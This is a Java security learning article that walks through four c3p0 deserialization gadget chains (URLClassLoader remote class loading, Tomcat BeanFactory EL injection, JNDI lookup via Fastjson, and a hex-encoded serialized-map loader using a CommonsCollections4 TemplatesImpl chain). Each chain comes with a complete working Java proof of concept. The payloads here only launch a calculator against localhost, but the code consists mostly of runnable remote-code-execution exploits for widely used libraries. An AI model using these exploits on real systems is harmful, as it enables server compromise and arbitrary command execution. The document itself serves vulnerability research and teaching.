# Java Security Learning—C3P0 Chain

Author: H3rmesk1t

Data: 2022.03.16

# C3P0 Introduction
[c3p0](https://www.mchange.com/projects/c3p0/#:~:text=rest%20is%20detail.-,What%20is%20c3p0%3F,-c3p0%20is%20an) is an easy-to-use library for making traditional JDBC drivers "enterprise-ready" by augmenting them with functionality defined by the jdbc3 spec and the optional extensions to jdbc2. As of version 0.9.5, c3p0 fully supports the jdbc4 spec.

In particular, c3p0 provides several useful services:
 - A class which adapt traditional DriverManager-based JDBC drivers to the newer javax.sql.DataSource scheme for acquiring database Connections.
 - Transparent pooling of Connection and PreparedStatements behind DataSources which can "wrap" around traditional drivers or arbitrary unpooled DataSources.

The library tries hard to get the details right:
 - c3p0 DataSources are both Referenceable and Serializable, and are thus suitable for binding to a wide-variety of JNDI-based naming services.
 - Statement and ResultsSets are carefully cleaned up when pooled Connections and Statements are checked in, to prevent resource- exhaustion when clients use the lazy but common resource-management strategy of only cleaning up their Connections. (Don't be naughty.)
 - The library adopts the approach defined by the JDBC 2 and 3 specification (even where these conflict with the library author's preferences). DataSources are written in the JavaBean style, offering all the required and most of the optional properties (as well as some non-standard ones), and no-arg constructors. All JDBC-defined internal interfaces are implemented (ConnectionPoolDataSource, PooledConnection, ConnectionEvent-generating Connections, etc.) You can mix c3p0 classes with compliant third-party implementations (although not all c3p0 features will work with external implementations of ConnectionPoolDataSource).

#Environmental construction

```xml
<dependencies>
    <dependency>
        <groupId>com.mchange</groupId>
        <artifactId>c3p0</artifactId>
        <version>0.9.5.2</version>
    </dependency>
    <dependency>
        <groupId>org.apache.tomcat</groupId>
        <artifactId>tomcat-catalina</artifactId>
        <version>8.5.27</version>
    </dependency>
</dependencies>
```

# Gadget
## URLCLassLoader
### Process Analysis
`com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase` is essentially an encapsulated object, which stores the `PropertyChangeSupport` and `VetoableChangeSupport` objects, which are used to support the functions of the listener.

When serializing and deserializing this class, it is necessary to save the internal `ConnectionPoolDataSource` member variable. If the `connectionPoolDataSource` itself is an unserialized object, it is encapsulated with references to it using `ReferenceIndirector`, and returns an IndirectlySerialized instance object that can be serialized.

<div align=center><img src="./images/1.png"></div>

Follow up on `ReferenceIndirector#indirectForm`, where the `getReference` method of `ConnectionPoolDataSource` is called to return a `Reference` object and encapsulate it using the `ReferenceSerialized` object.

<div align=center><img src="./images/3.png"></div>

During deserialization, its `IndirectlySerialized#getObject` method is called to regenerate the ConnectionPoolDataSource` object.

<div align=center><img src="./images/4.png"></div>

`ReferenceSerialized#getObject` calls the `InitialContext#lookup` method to try to use `JNDI` to get the corresponding object. When the `contextName` and `env` are both empty, call `ReferenceableUtils#referenceToObject` to use the information in `Reference` to get it.

<div align=center><img src="./images/5.png"></div>

Follow up here `ReferenceableUtils#referenceToObject` method, you can see that it uses `URLClassLoader` to load the class from the `URL` and instantiate it, so you can trigger the vulnerability by inserting a malicious `URL`.

<div align=center><img src="./images/6.png"></div>

### POC
According to the above analysis, a ConnectionPoolDataSource object that is not serialized and implements Referenceable is constructed, and its `getReference` method returns a `Reference` object with a malicious class location. When deserializing `PoolBackedDataSourceBase`, the `ConnectionPoolDataSource` is processed, so that `URLClassLoader` loads the specified malicious class.

```java
package org.h3rmesk1t.C3P0;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import ja
va.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.Base64;
import java.util.logging.Logger;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/16 2:31 pm
 */
public class C3P0Exploit1 {

    public static String serialize(Object obj) throws Exception {

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        byte[] expCode = byteArrayOutputStream.toByteArray();
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(expCode);
    }

    public static void unserialize(String expBase64) throws Exception {

        byte[] bytes = Base64.getDecoder().decode(expBase64);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }

    public static class notSerializable implements ConnectionPoolDataSource, Referenceable {

        String classFactory;
        String classFactoryLocation;

        public notSerializable(String classFactory, String classFactoryLocation) {

            this.classFactory = classFactory;
            this.classFactoryLocation = classFactoryLocation;
        }

        @Override
        public Reference getReference() throws NamingException {
            return new Reference(this.classFactory, this.classFactory, this.classFactoryLocation);
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public java.io.PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public void setLogWriter(java.io.PrintWriter out) throws SQLException {
        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }

    public static void main(String[] args) throws Exception {

        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
        ConnectionPoolDataSource connectionPoolDataSource = new notSerializable("Calc", "http://localhost:1209/");
        Field field = poolBackedDataSourceBase.getClass().getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(poolBackedDataSourceBase, connectionPoolDataSource);

        String serializeData = serialize(poolBackedDataSourceBase);
        System.out.println(serializeData);
        unserialize(serializeData);
    }
}
```

<div align=center><img src="./images/2.png"></div>

## BeanFactory
### Process Analysis
The remote malicious class used in the URLCLassLoader-Gadget is not used when the target environment cannot leave the network. In the ReferenceableUtils#referenceToObject, it is noted that when the value of `var0.getFactoryClassLocation() is null, it will load by default instead of remote loading. Then, the `getObjectInstance` method is called. Here you can refer to the Exploiting JNDI Injections in Java. Reference [Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java). Expression injection can be implemented by calling the ELProcessor's eval method through the `getObjectInstance` method of `Tomcat`. In theory, it can be used without networks when the target environment is `Tomcat8`.

### POC

```java
package org.h3rmesk1t.C3P0;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.ByteArrayInputStr
eam;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.Base64;
import java.util.logging.Logger;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/17 5:41 pm
 */
public class C3P0BeanFactory {

    public static String serialize(Object obj) throws Exception {

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        byte[] expCode = byteArrayOutputStream.toByteArray();
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(expCode);
    }

    public static void unserialize(String expBase64) throws Exception {

        byte[] bytes = Base64.getDecoder().decode(expBase64);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }

    private static class NotSerializable implements ConnectionPoolDataSource, Referenceable {

        private String classFactory;
        private String classFactoryLocation;

        public NotSerializable() {

            this.classFactory = "BeanFactory";
            this.classFactoryLocation = null;
        }

        public NotSerializable(String classFactory, String classFactoryLocation) {

            this.classFactory = classFactory;
            this.classFactoryLocation = classFactoryLocation;
        }

        @Override
        public Reference getReference() throws NamingException {

            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory", null);
            //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
            ref.add(new StringRefAddr("forceString", "x=eval"));
            //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','\"open -a Calculator\"']).start()\")"));

            return ref;
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public java.io.PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public void setLogWriter(java.io.PrintWriter out) throws SQLException {
        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }

    public static void main(String[] args) throws Exception {

        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
        ConnectionPoolDataSource connectionPoolDataSource1 = new NotSerializable();
        Field field = poolBackedDataSourceBase.getClass().getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(poolBackedDataSourceBase, connectionPoolDataSource1);

        String serializeData = serialize(poolBackedDataSourceBase);
        System.out.println(serializeData);
        unserial
ize(serializeData);
    }
}
```


## JNDI
### Process Analysis
There are two classes that implement `ConnectionPoolDataSource`, followed up with `JndiRefConnectionPoolDataSource`, where the `JndiRefDataSourceBase#setJndiName` method (`JndiRefForwardingDataSource` inherits the `setJndiName` method in `JndiRefDataSourceBase`) to get the value of `jndiName`.

<div align=center><img src="./images/7.png"></div>

<div align=center><img src="./images/8.png"></div>

<div align=center><img src="./images/9.png"></div>

Secondly, the `JndiRefConnectionPoolDataSource` class has the `LoginTimeout` property and its `setter` method,
Its `setter` method will call the `setLoginTimeout` method of the internal `WrapperConnectionPoolDataSource` object. After tracing, you will find that you are coming to `JndiRefForwardingDataSource#setLoginTimeout`.

<div align=center><img src="./images/10.png"></div>

<div align=center><img src="./images/11.png"></div>

<div align=center><img src="./images/12.png"></div>

Follow up `JndiRefForwardingDataSource#inner`, which will call `JndiRefForwardingDataSource#dereference`, and follow up again
In this method, a lookup query will be performed based on the `JndiRefForwardingDataSource#jndiName` property, and the `jndiName` property can be controlled by the `JndiRefConnectionPoolDataSource#setter` method as above.

<div align=center><img src="./images/13.png"></div>

<div align=center><img src="./images/14.png"></div>

Therefore, in the environment of `Fastjson`, `Jackson` and other environments, the `jndiRefConnectionPoolDataSource` class is called the `jndiname` and `logintimeout` properties of the `jndiRefConnectionPoolDataSource` class is called, and the malicious RMI` server address is passed to the `jndiname` server address, and then the `logintimeout#setter` method is called to make the victim machine go to the malicious address in `jndiname` set as set by `lookup`, causing `JNDI` injection.

### POC

```java
package org.h3rmesk1t.C3P0;

import com.alibaba.fastjson.JSON;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/17 3:34 pm
 */
public class C3P0JNDI {

    public static void main(String[] args) throws Exception {

        String poc = "{\"@type\": \"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\n"+"\"jndiName\": \"ldap://127.0.0.1:1389/ciedhl\",\n"+"\"loginTimeout\": 0}";
        JSON.parseObject(poc);
    }

}
```

<div align=center><img src="./images/15.png"></div>

## Hex Serialized Byte Loader
### Process Analysis
In `JNDI-Gadget`, it is used to utilize the implementation class `JndiRefConnectionPoolDataSource` of ConnectionPoolDataSource`, and this `Gadget` utilizes `WrapperConnectionPoolDataSource`. `WrapperConnectionPoolDataSource` is inherited from `WrapperConnectionPoolDataSourceBase`, and the attribute `userOverridesAsString` and its `setter` method `setUserOverridesAsString` is triggered to handle the `fireVetoableChange` event.

<div align=center><img src="./images/16.png"></div>

There is a method `setUpPropertyListeners` in WrapperConnectionPoolDataSource`, which has a judgment statement. When its property is `userOverridesAsString`, the `parseUserOverridesAsString` method will be called.

<div align=center><img src="./images/17.png"></div>

Follow up on the `parseUserOverridesAsString` method, first intercept the `userOverridesAsString`, then complete hexadecimal decoding, then call the `fromByteArray` function, and finally trigger the deserialization operation.

<div align=center><img src="./images/18.png"></div>

<div align=center><img src="./images/19.png"></div>

<div align=center><img src="./images/20.png"></div>

<div align=center><img src="./images/21.png"></div>

### POC
In the `Fastjson` and `Jackson` environments, this `Gadget` is more suitable for use without leaving the network environment.

```java
package org.h3rmesk1t.C3P0;

import com.alibaba.fastjson.JSON;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/17 4:38 pm
 */
public class C3P0Hex {

    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static PriorityQueue CommonsCollections4() throws Exception {

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = pool.makeClass("c3p0Exploit");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator\");";
        ctClass.makeClassInitializer().insertBefore(shell);

        byte[] shellCode = ctClass.toBytecode();
        byte[][] targetCode = new byte[][]{shellCode};

        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_name", "h3rmesk1t");
        setFieldValue(templatesImpl, "_bytecodes", targetCode);
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);

        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, transformingComparator);

        return priorityQueue;
    }

    public static byte[] toByteArray(InputStream in) throws Exception {
        byte[] classBytes;
        classBytes = new byte[in.available()];
        in.read(classBytes);
        in.close();
        return classBytes;
    }

    public static String bytesToHexString(byte[] bArray, int length) {
        StringBuffer sb = new StringBuffer(length);

        for(int i = 0; i < length; ++i) {
            String sTemp = Integer.toHexString(255 & bArray[i]);
            if (sTemp.length() < 2) {
                sb.append(0);
            }

            sb.append(sTemp.toUpperCase());
        }
        return sb.toString();
    }

    public static void main(String[] args) throws Exception {

        PriorityQueue queue = CommonsCollections4();

        String filePath = "src/main/java/org/h3rmesk1t/C3P0/ser.bin";
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(filePath));
        outputStream.writeObject(queue);
        outputStream.close();
        InputStream inputStream = new FileInputStream(filePath);
        byte[] bytes = toByteArray(inputStream);
        String hexString = bytesToHexString(bytes, bytes.length);
        
        String poc = "{\n\t\"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\n\t\"userOverridesAsString\": \"HexAsciiSerializedMap:" + hexString + ";\"\n}";
        System.out.println(poc);
        JSON.parseObject(poc);
    }
}
```

<div align=center><img src="./images/22.png"></div>


# refer to
 - [Three gadgets of c3p0](http://redteam.today/2020/04/18/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget/)
 - [Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)